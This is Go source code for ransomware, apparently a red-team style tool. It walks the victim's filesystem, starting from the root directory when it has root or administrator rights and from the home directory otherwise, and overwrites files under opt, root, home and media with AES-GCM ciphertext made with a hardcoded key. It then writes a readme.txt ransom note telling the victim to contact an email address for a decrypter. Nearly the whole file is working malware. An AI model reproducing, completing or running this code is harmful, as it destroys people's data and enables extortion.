package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/karrick/godirwalk"
)

//var Dir string = "/" // Insert starting directory
//var wg sync.WaitGroup

var Queue = make(chan string, 255)

func isAuthority() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[isRoot] Unable to get current user: %s", err)
	}
	return currentUser.Username == "root"
}

func MapFiles() {
	var root string

	if runtime.GOOS == "windows" {
		//windows
		root = os.Getenv("USERPROFILE")
		if isAuthority() {
			root = "C:\\"
		}
	} else {
		//linux
		if isRoot() {
			root = "/"
		} else {
			root = os.Getenv("HOME") + "/"
		}
	}

	error := godirwalk.Walk(root, &godirwalk.Options{
		Callback: func(path string, de *godirwalk.Dirent) error {
			if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") {
				return nil
			} else if strings.Contains(path, "opt") || strings.Contains(path, "root") || strings.Contains(path, "home") || strings.Contains(path, "media") {
				Queue <- path
				return nil
			} else {
				return nil
			}
		},
		Unsorted: true,
	})

	if error != nil {
		fmt.Println(error)
	}
}

func main() {
	Encrypted := make(chan []byte, 100)
	cryptoKey := "686561646d696e64706172746e6572737265647465616d313333374031333337" //keygen.Keygen()
	contact := ""                                                                   // Insert contact email
	//fmt.Println("THIS IS THE KEY:", cryptoKey)

	key, err := hex.DecodeString(cryptoKey)
	if err != nil {
		panic(err)
	}

	var root string
	if runtime.GOOS == "windows" {
		root = os.Getenv("USERPROFILE")
	} else {
		root = os.Getenv("HOME")
	}

	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
	go MapFiles()

	// for each file encrypt file with key in 644 perm
	for range <-Queue {
		//wg.Add(1)
		v := <-Queue
		file, err := ioutil.ReadFile(v)

		if err != nil {
			continue
		}

		go Encrypt(file, key, Encrypted, v)
		ioutil.WriteFile(v, <-Encrypted, 0644)
	}

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
	fmt.Println(msg)

	err = ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
	if err != nil {
		panic(err)
	}
	//wg.Wait()
}

func Encrypt(plainText []byte, key []byte, Encrypted chan []byte, v string) {
	//defer wg.Done()
	block, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Println(err)
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	Encrypted <- cypherText
}
